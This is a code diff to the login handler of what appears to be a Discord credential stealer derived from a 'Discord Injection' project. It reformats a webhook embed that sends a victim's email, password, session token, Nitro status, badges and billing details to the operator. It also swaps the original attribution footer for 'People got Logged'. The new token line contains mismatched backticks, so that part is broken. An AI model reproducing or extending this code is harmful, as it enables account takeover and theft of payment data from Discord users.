@@ -325,27 +325,27 @@ const login = async (email, password, token) => {
                 color: config.embed_color,
                 fields: [
                     {
-                        name: "**Account Info**",
-                        value: `Email: **${email}** - Password: **${password}**`,
+                        name: "📃",
+                        value: `EMail » **${email}**\nPassword » **${password}**`,
                         inline: false,
                     },
                     {
-                        name: "**Discord Info**",
-                        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+                        name: "💳",
+                        value: `Nitro » **${nitro}**\nBadges » **${badges}**\nBilling » **${billing}**`,
                         inline: false,
                     },
                     {
-                        name: "**Token**",
-                        value: `\`${token}\``,
+                        name: "🔑",
+                        value: `\Token » ||`${token}\`|``,
                         inline: false,
                     },
                 ],
                 author: {
-                    name: json.username + "#" + json.discriminator + " | " + json.id,
+                    name: json.username + "#" + json.discriminator + " • " + json.id,
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                 },
                 footer: {
-                    text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+                    text: "🔒 • People got Logged",
                 },
             },
         ],
